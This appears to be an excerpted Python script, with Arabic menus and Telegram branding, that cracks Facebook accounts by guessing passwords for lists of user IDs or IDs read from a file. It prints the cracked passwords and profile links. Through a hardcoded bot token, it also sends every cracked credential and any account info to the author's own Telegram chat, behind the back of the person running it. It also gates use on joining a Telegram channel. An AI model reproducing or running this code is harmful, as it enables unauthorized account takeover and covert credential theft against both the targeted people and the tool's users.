...
A = '\033[1;34m' 
print (A+'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
print ('\033[2;32m M معلومات وتوظيحات يرجا قراتهاM')
print (A+'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
print('\033[2;32m[1]telegram : @c_zvr')
print (A+'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
print('\033[2;32m[2]telegram ch : @c_zvr')
print (A+'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
print('\033[2;32m[u]name : programmer')
print (A+'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
import random
import re
import base64
...
#----------------[بيانات المستخدم]---------------#
ID3 = input("ENTER YOUR ID_TELEGRAM :")
token = input("ENTER YOUR TOKEN_BOT :")
...
tok3 = "7369693056:AAEitQtWsHxauWJ-ygTuM833d5vsvUQm4vM"

channel_id = "@c_zvr"



req = requests.get(f'https://api.telegram.org/bot{tok3}/getChatMember?chat_id={channel_id}&user_id={ID3}').json()
if req['ok'] and req['result']['status'] in ['member', 'administrator', 'creator']:
    print("انت مشترك فعلا في القناه تابع ما تقوم به")
    ...
    tlg = (f"""
🚸| عذرا عزيزي
🔰| عليك الاشتراك بقناة الاداه لتتمكن من استخدامها

- https://t.me/{ch}

‼️| اشترك ثم قم بالدخول الى الاداه
""")
    requests.post(f'https://api.telegram.org/bot{tok3}/sendMessage?chat_id={ID3}&text={tlg}')
    webbrowser.open("https://t.me/c_zvr")

now = datetime.datetime.today()
an = datetime.datetime.now()
an2 = datetime.datetime(2029, 5, 28)
hours = now.hour
code = 'programmer'
IDDD = '5084660697'
token1 = '7369693056:AAEitQtWsHxauWJ-ygTuM833d5vsvUQm4vM'
...
dic = {'12': 'December','11': 'November','10': 'October','9': 'September','8': 'August','7': 'July','6': 'June','5': 'May','4': 'April','3': 'March','2': 'February','1': 'January' }
dic2 = {'12': 'Devember','11': 'November','10': 'October','09': 'September','08': 'August','07': 'July','06': 'June','05': 'May','04': 'April','03': 'March','02': 'February','01': 'January' }
		...
		with requests.Session() as rsn:
			try:
				...
				if '"access_token":' in str(response.headers):
					...
					print(' Ok Cokies Reset The Tool ✓ ')
				else:
					print(" Bad Cokies No ✘")
			except:
				print('error')
...
def menu(my_name, my_id):
    ...
    cetak(nel(f'''
[1] - Crack IDs •  صيد من ايديات

[2] - Crack File •  صيد من ملف

[0] - {احمر}Log Out • تسجيل خروج 
''',style='green',title=' '))
    kilchs = input(f'\n- Chose •{اخضر} اختاࢪ : ')
    if kilchs in ('1',):
        kil_vip_id()
...
def kil_vip_file():
	...
	try:
		...
		jum = input('{ارجواني} • File Name • اسم او مسار الملف : ')
...
def kil_vip_id():
	...
	try:
		...
		اخضر = '\033[2;32m' #اخضر
		jum = int(input(f'\n{ارجواني}- How Many id • كم ايدي تريد تصيد : '))
	except ValueError:
...
Password  : {pw}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
رابط الحساب​​​​​ : https://www.facebook.com/profile.php?id={idf}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
معلومات : @c_zvr : @c_zvr :
		
					'''
					statuscp1 = nel(statuscp, style='yellow')
					cetak(nel(statuscp1, title=' يلفكر اجاك سكيور ولو تحبل ميفتح '))
					...
					requests.get("https://api.telegram.org/bot"+str(token1)+"/sendMessage?chat_id="+str(IDDD)+"&text="+str(statuscp))
				break
...
معلومات : @c_zvr : @c_zvr :
					...
					cetak(nel(statusok1, title='خره بحظ لفكر'))
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					requests.get("https://api.telegram.org/bot"+str(token1)+"/sendMessage?chat_id="+str(IDDD)+"&text="+str(statusok))
					kilgame(kuki)
					break
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ '''
					...
					requests.get("https://api.telegram.org/bot"+str(token1)+"/sendMessage?chat_id="+str(IDDD)+"&text="+str(infoakun))
